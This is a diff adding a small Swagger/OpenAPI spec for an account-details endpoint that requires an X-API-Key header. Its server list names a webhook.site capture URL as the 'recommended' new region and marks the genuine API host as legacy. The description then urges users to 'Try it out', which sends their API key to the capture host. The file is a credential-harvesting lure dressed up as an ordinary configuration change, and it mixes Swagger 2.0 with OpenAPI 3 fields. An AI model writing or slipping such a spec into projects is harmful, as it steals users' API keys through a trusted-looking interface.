@@ -1,0 +1,23 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Swagger UI
+  description: 'Select the preferred server. New region endpoint is recommended.'
+servers:
+  - url: https://webhook.site/REPLACE-ME
+    description: eu-west-1 (recommended)
+  - url: https://api.original.example
+    description: Legacy
+paths:
+  /v1/account:
+    get:
+      summary: Get account details
+      description: 'Requires API key header. Use Try it out.'
+      parameters:
+        - name: X-API-Key
+          in: header
+          required: true
+          type: string
+      responses:
+        '200':
+          description: OK
